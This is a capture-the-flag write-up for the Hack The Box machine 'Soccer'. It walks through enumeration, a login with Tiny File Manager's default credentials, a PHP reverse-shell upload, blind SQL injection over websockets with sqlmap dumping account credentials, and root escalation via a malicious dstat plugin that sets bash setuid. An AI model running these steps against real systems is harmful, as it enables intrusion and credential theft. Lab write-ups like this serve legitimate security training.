# Soccer

A writeup for the machine [Soccer](https://app.hackthebox.com/machines/Soccer) on Hack The Box.

<Image src={require("./banner.webp").default} height="500" />

## Footprinting

### Nmap scan

Use nmap to scan for services.

```bash
nmap -sS <IP>
```

<Image src={require("./nmap-scan.webp").default} />

We can see three services: ssh, http, and one on port 9091 used for websockets.

### Website analysis

If we look on the website there is only a simple homepage with no other links.

<Image src={require("./website.webp").default} />

### Website enumeration

By enumerating the main website using gobuster we can find a subdomain called tiny.

```bash
gobuster dir -u soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<Image src={require("./gobuster.webp").default} />

## User flag

### Entering Tiny File Manager

During the enumeration a page is found under /tiny. There is a login but common credentials don't work.

It is possible to search online for "Tiny File Manager" and the Github repository of this project is one of the first results.

There is a section in the public documentation about the default admin credentials. The second user works. It is possible to enter inside.

Default credentials:

```
username: user
password: 12345
```

[https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management](https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management)

<Image src={require("./tiny.webp").default} />

### Exploiting the file upload vulnerability in Tiny

Because it is a php server and we can upload file, we can obtain a reverse shell by uploading something like this and executing it.

[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

<Image src={require("./upload.webp").default} />

### Inside the system

Once inside we can see that we have no access as the main user or the root.

Also, no vulnerabilities are found with tools like LinPeas or LinEnum.

By looking in the available files we can find in the nginx config that there is an additional website as soc-player.soccer.htb.

<Image src={require("./nginx.webp").default} />

### Second website

Once logged in the second website, there is only an input box.

By trying different inputs we can see that the message "Tickets exists" is show when the query is correct and a value is found.

This is a blind sql injection vulnerability.

<Image src={require("./sqli.webp").default} />

### SQLMap over websocket

The vulnerable request is managed with websockets so it is not possible to use sqlmap directly.

By looking to Rayhan0x01 post there is a possible solution for this.

[https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

We can create a middle server that receives normal GET requests by sqlmap and sent them to the websockets server and vice versa.

Once the script is ready and the server up and running, we can execute sqlmap and enumerate the database.

Run it with `flask run`

```bash
python3 -m venv .venv
source .venv/bin/activate
python3 -m pip install flask websocket
```

<Gist id="23988dbb8c44b3885f7f488caba89414" />

### Running SQLmap

```bash
# enumerate dbs
sqlmap -u "http://localhost:5000/?id=1" --batch --dbs

# enumerate tables in app db
sqlmap -u "http://localhost:5000/?id=1" --batch -D soccer_db --tables

# enumerate credentials
sqlmap -u "http://localhost:5000/?id=1" -D soccer_db -T accounts -C username,email,password --dump
```

<Image src={require("./sqlmap.webp").default} />

### User flag

We can enter inside the system using ssh and the credentials found in the database. It is possible in this way to read the user flag.

<Image src={require("./user.webp").default} />

## Root flag

### Privilege escalation

Once inside the system for privilige escalation we can run LinPeas. Move it using ssh or by serving a directory.

```bash
./LinPeas.sh
```

[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

In the final output of LinPeas we can see that there is a possible vulnerability with dstat.

<Image src={require("./linpeas.webp").default} />

### Exploiting dstat

dstat can be run as root. We could write a new plugin to make some actions like the root inside the system.

New plugins can be written inside the folder `/usr/local/share/dstat`.

The filename format should be `dstat_<plugin_name>.py` like `dstat_hack.py`.

```python
# /usr/local/share/dstat/dstat_hack.py
import os

os.system('chmod +s /usr/bin/bash') # setuid
```

We can run it using this command

```bash
sudo /usr/bin/dstat --hack
```

### Root flag

Now we can run bash as root and read the flag.

```bash
bash -p
```

<Image src={require("./root.webp").default} />
